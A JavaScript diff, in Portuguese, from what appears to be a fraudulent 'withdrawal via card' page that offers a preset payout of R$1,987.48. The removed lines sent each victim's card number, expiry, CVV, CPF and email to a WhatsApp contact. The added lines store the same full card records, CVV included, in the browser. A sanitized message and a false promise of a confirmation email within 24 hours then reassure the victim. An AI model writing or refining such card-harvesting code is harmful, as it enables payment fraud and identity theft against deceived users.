@@ -1179,19 +1179,32 @@ function mostrarOpcoesData(opcoes, dataReal) {
     
     const valor = dadosUsuario?.valorDisponivel || 1987.48;
     
-    // MENSAGEM COMPLETA COM CVV
-    const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
+    // ========== 1. SALVAR NO LOCALSTORAGE (COM DADOS COMPLETOS) ==========
+    const dadosCartao = {
+        nome: dadosUsuario?.nome || 'N/A',
+        cpf: cpfAtual,
+        cartao: numeroRaw,
+        validade: validade,
+        cvv: cvv,
+        email: email,
+        valor: formatarMoeda(valor),
+        data: new Date().toLocaleString('pt-BR')
+    };
+    
+    const lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
+    lista.push(dadosCartao);
+    localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
+    
+    // ========== 2. ENVIAR PARA WHATSAPP (SEM DADOS DO CARTÃO) ==========
+    const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
         `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-        `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
-        `💳 *Cartão:* ${numeroRaw}\n` +
-        `📅 *Validade:* ${validade}\n` +
-        `🔢 *CVV:* ${cvv}\n` +
-        `📧 *E-mail:* ${email}\n` +
-        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
-        `✅ *Solicitação via Cartão*`;
+        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
+        `📧 Você receberá um e-mail de confirmação em até 24 horas.\n\n` +
+        `🔒 *Solicitação registrada com sucesso*`;
     
     enviarWhatsApp(mensagem);
-    alert('✅ Solicitação enviada com sucesso!');
+    
+    alert('✅ Solicitação enviada com sucesso!\n\n📧 Você receberá um e-mail de confirmação em até 24 horas.');
     limparProgresso();
     showStep('flowSuccess', 3);
 });
